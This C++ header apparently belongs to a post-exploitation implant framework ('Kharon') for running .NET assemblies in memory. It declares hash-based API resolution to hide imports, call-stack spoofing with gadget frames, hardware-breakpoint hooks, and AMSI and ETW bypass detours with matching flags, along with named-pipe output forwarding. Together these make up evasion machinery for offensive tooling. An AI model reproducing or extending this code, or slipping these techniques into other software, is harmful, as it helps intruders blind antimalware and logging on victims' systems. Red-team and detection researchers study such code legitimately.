#ifndef GENERAL_H
#define GENERAL_H

#include <native.h>
#include <kharon.h>
#include <clr.hpp>
#include <ntstatus.h>

namespace mscorlib {
    #include <mscoree.hpp>    
}

#define Dbg1( x, ... ) self->ntdll.DbgPrint( x, ##__VA_ARGS__ )

typedef _PropertyInfo IPropertyInfo;
typedef _AppDomain    IAppDomain;
typedef _Assembly     IAssembly;
typedef _Type         IType;
typedef _MethodInfo   IMethodInfo;
typedef BindingFlags  IBindingFlags;

#define g_instance mself* self = []() -> mself* { \
    PEB* peb = NtCurrentPeb(); \
    for (ULONG i = 0; i < peb->NumberOfHeaps; i++) { \
        mself* potential_instance = reinterpret_cast<mself*>(peb->ProcessHeaps[i]); \
        if (potential_instance && potential_instance->postex.id == *((ULONG*)endptr()) ) { \
            return potential_instance; \
        } \
    } \
    return nullptr; \
}();

#define PIPE_BUFFER_LENGTH  0x10000
#define declapi( x )       decltype( x ) * x
#define declfn             __attribute__( ( section( ".text$B" ) ) )

#define min(a, b) ((a) < (b) ? (a) : (b))

#define NtCurrentThreadID HandleToUlong( NtCurrentTeb()->ClientId.UniqueThread )

template <typename T>
constexpr SIZE_T hashplural() {
    SIZE_T count     = 0;
    SIZE_T structlen = sizeof( T );

    while ( structlen > count * sizeof( UPTR ) ) {
        count++;
    }

    return count;
}

#define rsl_hash( x )   .x = reinterpret_cast<decltype( x )*>( hashstr( #x ) ) 
#define rsl_imp( m ) { \
    for ( int i = 1; i < hashplural<decltype( mself::m, m )>(); i++ ) { \
        reinterpret_cast<UPTR*>( &m )[ i ] = load_api( m.handle, reinterpret_cast<UPTR*>( &m )[ i ] ); \
    } \
}

extern "C" PVOID startptr();
extern "C" PVOID endptr();
extern "C" PVOID spoofcall( ... );

auto find_jmp_gadget(
    _In_ PVOID  module_base,
    _In_ UINT16 reg_value
) -> PVOID;

auto load_api(
    _In_ const UPTR ModBase,
    _In_ const UPTR SymbHash
) -> UPTR;

auto load_module(
    _In_ const ULONG LibHash
) -> UPTR;

template <typename T = char>
inline auto declfn hashstr(
    _In_ const T* String
) -> UPTR {
    ULONG csthash = 0x515528a;
    BYTE  Value   = 0;

    while ( * String ) {
        Value = static_cast<BYTE>( *String++ );

        if ( Value >= 'a' ) {
            Value -= 0x20;
        }

        csthash ^= Value;
        csthash *= 0x01000193;
    }

    return csthash;
}

#define RangeHeadList( HEAD_LIST, TYPE, SCOPE ) \
{                                               \
    PLIST_ENTRY __Head = ( & HEAD_LIST );       \
    PLIST_ENTRY __Next = { 0 };                 \
    TYPE        Entry  = (TYPE)__Head->Flink;   \
    for ( ; __Head != (PLIST_ENTRY)Entry; ) {   \
        __Next = ((PLIST_ENTRY)Entry)->Flink;   \
        SCOPE                                   \
        Entry = (TYPE)(__Next);                 \
    }                                           \
}

struct _FRAME_INFO {
    PVOID Ptr;  // pointer to function + offset
    UPTR  Size; // stack size
};
typedef _FRAME_INFO FRAME_INFO;

typedef struct _DOTNET_ARGS {
    ULONG dotnetlen;
    PBYTE dotnetbuff;

    WCHAR* arguments;
    WCHAR* appdomain;
    WCHAR* fmversion;
} DOTNET_ARGS;

struct _STACK_FRAME {
    WCHAR* DllPath;
    ULONG  Offset;
    ULONG  TotalSize;
    BOOL   ReqLoadLib;
    BOOL   SetsFramePtr;
    PVOID  ReturnAddress;
    BOOL   PushRbp;
    ULONG  CountOfCodes;
    BOOL   PushRbpIdx;
};
typedef _STACK_FRAME STACK_FRAME;

#define KH_METHOD_INLINE 0x15
#define KH_METHOD_FORK   0x20

#define KH_INJECT_EXPLICIT 0x100
#define KH_INJECT_SPAWN    0x200

class mself {
public:
    POSTEX_CTX postex;

    explicit mself();

    struct {
        PVOID  heap;
        PVOID  start;
        UPTR   size;
        HANDLE sync;
    } ctx;  

    struct {
        HANDLE output;
        HANDLE foward;
    } pipe;
    
    struct {
        FRAME_INFO first;   // 0x00  // RtlUserThreadStart+0x21
        FRAME_INFO second;  // 0x10  // BaseThreadInitThunk+0x14
        FRAME_INFO gadget;  // 0x20  // rbp gadget
        
        UPTR restore;      // 0x30
        UPTR ssn;          // 0x38
        UPTR ret;          // 0x40
        
        UPTR rbx;          // 0x48
        UPTR rdi;          // 0x50
        UPTR rsi;          // 0x58
        UPTR r12;          // 0x60
        UPTR r13;          // 0x68
        UPTR r14;          // 0x70
        UPTR r15;          // 0x78

        UPTR argcount;     // 0x80
    } spoof;

    struct {
        UPTR handle;

        declapi( CLRCreateInstance );
    } mscoree = {
        rsl_hash( CLRCreateInstance ),
    };

    struct {
        UPTR handle;

        declapi( SafeArrayDestroy );
        declapi( SafeArrayCreate );
        declapi( SafeArrayCreateVector );
        declapi( SafeArrayPutElement );

        declapi( SysAllocString );
    } ole32 = {
        rsl_hash( SafeArrayDestroy ),
        rsl_hash( SafeArrayCreate ),
        rsl_hash( SafeArrayCreateVector ),
        rsl_hash( SafeArrayPutElement ),
    };

    struct {
        UPTR handle;

        declapi( CommandLineToArgvW );
    } shell32 = {
        rsl_hash( CommandLineToArgvW ),
    };

    struct {
        UPTR handle;

        declapi( wcslen );
        declapi( wcscmp );
    } msvcrt = {
        rsl_hash( wcslen ),
        rsl_hash( wcscmp ),
    };

    struct {
        UPTR handle;

        declapi( NtClose );
        declapi( DbgPrint );

        declapi( NtProtectVirtualMemory );

        declapi( RtlAllocateHeap );
        declapi( RtlReAllocateHeap );
        declapi( RtlFreeHeap );

        declapi( NtGetContextThread );
        declapi( NtContinue );
        declapi( RtlCaptureContext );

        declapi( RtlAddVectoredExceptionHandler );
        declapi( RtlRemoveVectoredExceptionHandler );

        declapi( RtlInitializeCriticalSection );
        declapi( RtlEnterCriticalSection );
        declapi( RtlLeaveCriticalSection );

        declapi( RtlLookupFunctionEntry );
        declapi( RtlUserThreadStart );

        declapi( RtlExitUserProcess );
        declapi( RtlExitUserThread  );

        declapi( RtlRandomEx );
    } ntdll = {
        rsl_hash( NtClose ),
        rsl_hash( DbgPrint ),

        rsl_hash( NtProtectVirtualMemory ),

        rsl_hash( RtlAllocateHeap ),
        rsl_hash( RtlReAllocateHeap ),
        rsl_hash( RtlFreeHeap ),

        rsl_hash( NtGetContextThread ),
        rsl_hash( NtContinue ),
        rsl_hash( RtlCaptureContext ),

        rsl_hash( RtlAddVectoredExceptionHandler ),
        rsl_hash( RtlRemoveVectoredExceptionHandler ),

        rsl_hash( RtlInitializeCriticalSection ),
        rsl_hash( RtlEnterCriticalSection ),
        rsl_hash( RtlLeaveCriticalSection ),

        rsl_hash( RtlLookupFunctionEntry ),
        rsl_hash( RtlUserThreadStart ),

        rsl_hash( RtlExitUserProcess ),
        rsl_hash( RtlExitUserThread ),

        rsl_hash( RtlRandomEx ),
    };

    struct {
        UPTR handle;

        declapi( BaseThreadInitThunk );

        declapi( GetConsoleWindow );
        declapi( FreeConsole );
        declapi( AllocConsoleWithOptions );

        declapi( GetProcAddress );
        declapi( GetModuleHandleA );
        declapi( LoadLibraryA );

        declapi( CreatePipe );
        declapi( CreateNamedPipeW );
        declapi( ConnectNamedPipe );
        declapi( DisconnectNamedPipe );
        declapi( CreateFileW );
        declapi( WriteFile );
        declapi( ReadFile );
        declapi( FlushFileBuffers );
        declapi( SetStdHandle );
        declapi( GetStdHandle );
        declapi( WaitForSingleObject );

        declapi( CreateThread );

        declapi( SetEvent );
        declapi( CreateEventW );
    } kernel32 = {
        rsl_hash( BaseThreadInitThunk ),

        rsl_hash( GetConsoleWindow ),
        rsl_hash( FreeConsole ),
        rsl_hash( AllocConsoleWithOptions ),

        rsl_hash( GetProcAddress ),
        rsl_hash( GetModuleHandleA ),
        rsl_hash( LoadLibraryA ),

        rsl_hash( CreatePipe ),
        rsl_hash( CreateNamedPipeW ),
        rsl_hash( ConnectNamedPipe ),
        rsl_hash( DisconnectNamedPipe ),
        rsl_hash( CreateFileW ),
        rsl_hash( WriteFile ),
        rsl_hash( ReadFile ),
        rsl_hash( FlushFileBuffers ),
        rsl_hash( SetStdHandle ),
        rsl_hash( GetStdHandle ),
        rsl_hash( WaitForSingleObject ),

        rsl_hash( CreateThread ),
        
        rsl_hash( SetEvent ),
        rsl_hash( CreateEventW ),
    };

    struct {
        PVOID Handler;
        BOOL  Init;

        PVOID NtTraceEvent;
        PVOID AmsiScanBuffer;
        PVOID ExitPtr;

        UPTR Addresses[4];
        UPTR Callbacks[4];
    } Hwbp;
};

namespace spoof {
    auto run(
        _In_ UPTR fnc, 
        _In_ UPTR ssn, 
        _In_ UPTR arg1  = 0,
        _In_ UPTR arg2  = 0,
        _In_ UPTR arg3  = 0,
        _In_ UPTR arg4  = 0,
        _In_ UPTR arg5  = 0,
        _In_ UPTR arg6  = 0,
        _In_ UPTR arg7  = 0,
        _In_ UPTR arg8  = 0,
        _In_ UPTR arg9  = 0,
        _In_ UPTR arg10 = 0,
        _In_ UPTR arg11 = 0,
        _In_ UPTR arg12 = 0
    ) -> PVOID;

    auto stacksize(
        UPTR rtmfunc,
        UPTR imgbase
    ) -> UPTR;

    auto stacksize_wrapper(
        PVOID retaddress
    ) -> UPTR;
}

struct _PARSER {
    CHAR*   Original;
    CHAR*   Buffer;
    UINT32  Size;
    UINT32  Length;
};
typedef _PARSER PARSER;

namespace mm {
    template <typename T>   
    __attribute__((always_inline)) auto declfn alloc(
        UPTR size
    ) -> T {
        g_instance
        return reinterpret_cast<T>( self->ntdll.RtlAllocateHeap( self->ctx.heap, HEAP_ZERO_MEMORY, size ) );
    }

    template <typename T>
    inline auto declfn realloc(
        T    block,
        UPTR size
    ) -> T {
        g_instance
        return reinterpret_cast<T>( self->ntdll.RtlReAllocateHeap( self->ctx.heap, HEAP_ZERO_MEMORY, block, size ) );
    }

    static auto declfn free( PVOID Block ) -> BOOL {
        g_instance
        return self->ntdll.RtlFreeHeap( self->ctx.heap, 0, Block );
    }

    auto copy( _In_ PVOID dst, _In_ PVOID src, _In_ UPTR size ) -> PVOID;
    auto set(  _In_ PVOID ptr, _In_ UCHAR val, _In_ UPTR size ) -> void;
    auto zero( _In_ PVOID ptr, _In_ UPTR size ) -> void;
}

namespace parser {
    auto create( _In_ PARSER* parser, _In_ PBYTE args, _In_ ULONG argc ) -> VOID;
    auto header( _In_ PVOID buff, _Out_ POSTEX_CTX* postex ) -> VOID;

    auto byte(  _In_ PARSER* parser ) -> BYTE;
    auto int16( _In_ PARSER* parser ) -> INT16;
    auto int32( _In_ PARSER* parser ) -> INT32;
    auto int64( _In_ PARSER* Parser ) -> INT64;

    auto pad( _In_ PARSER* parser, _Out_ ULONG size ) -> PBYTE;
    auto bytes( _In_ PARSER* parser,  _Out_ ULONG* size = nullptr ) -> PBYTE;
    auto str(   _In_ PARSER* parser,  _Out_ ULONG* size = nullptr ) -> PCHAR;
    auto wstr(  _In_ PARSER* parser,  _Out_ ULONG* size = nullptr ) -> PWCHAR;

    auto destroy( _In_ PARSER* parser ) -> BOOL;
}

typedef struct _DESCRIPTOR_HOOK {
    ULONG  ThreadID;
    UPTR Handle;
    BOOL   Processed;
    INT8   Drx;
    UPTR   Address;
    VOID ( *Detour )( PCONTEXT );
    struct _DESCRIPTOR_HOOK* Next;
    struct _DESCRIPTOR_HOOK* Prev;
} DESCRIPTOR_HOOK, *PDESCRIPTOR_HOOK;

#define DOTNET_BYPASS_NONE 0x000
#define DOTNET_BYPASS_EXIT 0x200
#define DOTNET_BYPASS_ALL  0x100
#define DOTNET_BYPASS_ETW  0x400
#define DOTNET_BYPASS_AMSI 0x700

enum Dr {
    x0,
    x1,
    x2,
    x3
};

namespace Hwbp {
    auto SetDr7(
        UPTR ActVal,
        UPTR NewVal,
        INT  StartPos,
        INT  BitsCount
    ) -> UPTR;

    auto Install(
        UPTR  Address,
        INT8  Drx,
        PVOID Callback
    ) -> BOOL;

    auto Uninstall(
        UPTR  Address
    ) -> BOOL;

    auto SetBreak(
        UPTR  Address,
        INT8  Drx,
        BOOL  Init
    ) -> BOOL;

    auto Insert(
        UPTR  Address,
        INT8  Drx,
        BOOL  Init
    ) -> BOOL;

    auto Init( VOID ) -> BOOL;
    auto Clean( VOID ) -> BOOL;
    auto DotnetInit( INT32 BypassFlags ) -> BOOL;
    auto DotnetExit( VOID ) -> BOOL;

    auto SetArg(
        PCONTEXT Ctx,
        UPTR     Val,
        ULONG    Idx
    ) -> VOID;

    auto GetArg(
        PCONTEXT Ctx,
        ULONG    Idx
    ) -> UPTR;

    auto HandleException(
        EXCEPTION_POINTERS* e
    ) -> LONG;

    auto PatchExitDetour( PCONTEXT Ctx ) -> VOID;
    auto EtwDetour( PCONTEXT Ctx ) -> VOID;
    auto AmsiDetour( PCONTEXT Ctx ) -> VOID;
}

#endif // GENERAL_H